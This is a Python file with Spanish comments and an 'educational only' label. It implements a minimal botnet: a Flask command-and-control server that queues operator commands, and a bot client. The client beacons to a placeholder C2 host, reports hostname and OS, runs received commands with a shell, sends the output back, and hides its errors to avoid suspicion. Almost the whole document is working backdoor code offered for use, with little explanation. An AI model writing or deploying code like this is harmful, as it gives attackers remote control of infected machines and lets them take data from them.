# ── Arquitectura C2 simplificada — Servidor de comando (Python) ──
# SOLO EDUCATIVO — Muestra la arquitectura de comunicación bot/C2
# Simplificado para comprensión; las botnets reales usan cifrado y evasión avanzada

from flask import Flask, request, jsonify # type: ignore
from datetime import datetime

app = Flask(__name__)
bots_conectados = {}   # Registro de bots: {bot_id: {ip, last_seen, info}}
cola_comandos   = {}   # Comandos pendientes: {bot_id: [cmd1, cmd2]}

# ── Endpoint de check-in: el bot reporta que está vivo ──
@app.route('/checkin', methods=['POST'])
def checkin():
    datos  = request.json
    bot_id = datos.get('id')
    bots_conectados[bot_id] = {
        'ip':        request.remote_addr,
        'last_seen': str(datetime.now()),
        'hostname':  datos.get('hostname'),
        'os':        datos.get('os'),
    }
    # Devolver comandos pendientes para este bot
    comandos = cola_comandos.pop(bot_id, [])
    return jsonify({'status': 'ok', 'commands': comandos})

# ── Endpoint para que el operador envíe comandos a un bot ──
@app.route('/cmd/<bot_id>', methods=['POST'])
def enviar_comando(bot_id):
    cmd = request.json.get('command')
    if bot_id not in cola_comandos:
        cola_comandos[bot_id] = []
    cola_comandos[bot_id].append(cmd)
    return jsonify({'queued': cmd, 'bot': bot_id})

# ── Endpoint para ver todos los bots activos ──
@app.route('/bots')
def listar_bots():
    return jsonify(bots_conectados)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)

# ── Cliente bot simplificado con check-in periódico (Python) ──
# SOLO EDUCATIVO — Simula el comportamiento del malware en el equipo infectado
import requests, platform, uuid, time, subprocess # type: ignore

# Identificador único para este bot
BOT_ID  = str(uuid.uuid4())[:8]
C2_URL  = 'http://servidor-c2.ejemplo.com:8080'  # URL del servidor C2
INTERVALO = 30  # segundos entre check-ins (beaconing)

def get_info():
    
    """Recopila info del sistema para enviar al C2"""
    return {
        'id':       BOT_ID,
        'hostname': platform.node(),
        'os':       platform.system() + ' ' + platform.release(),
    }

def ejecutar_comando(cmd: str) -> str:
    """Ejecuta el comando recibido y devuelve el output"""
    try:
        resultado = subprocess.run(cmd, shell=True, capture_output=True,
                                   text=True, timeout=30)
        return resultado.stdout + resultado.stderr
    except Exception as e:
        return str(e)

def bucle_beaconing():
    """Loop principal: check-in periódico y ejecución de comandos"""
    while True:
        try:
            resp = requests.post(f'{C2_URL}/checkin', json=get_info(), timeout=10)
            datos = resp.json()
            # Ejecutar cada comando recibido del C2
            for cmd in datos.get('commands', []):
                print(f'[BOT] Ejecutando: {cmd}')
                output = ejecutar_comando(cmd)
                # Enviar resultado de vuelta al C2
                requests.post(f'{C2_URL}/resultado', json={
                    'bot_id': BOT_ID, 'cmd': cmd, 'output': output
                })
        except Exception:
            pass  # Silenciar errores para no levantar sospechas
        time.sleep(INTERVALO)  # Esperar antes del siguiente check-in

bucle_beaconing()
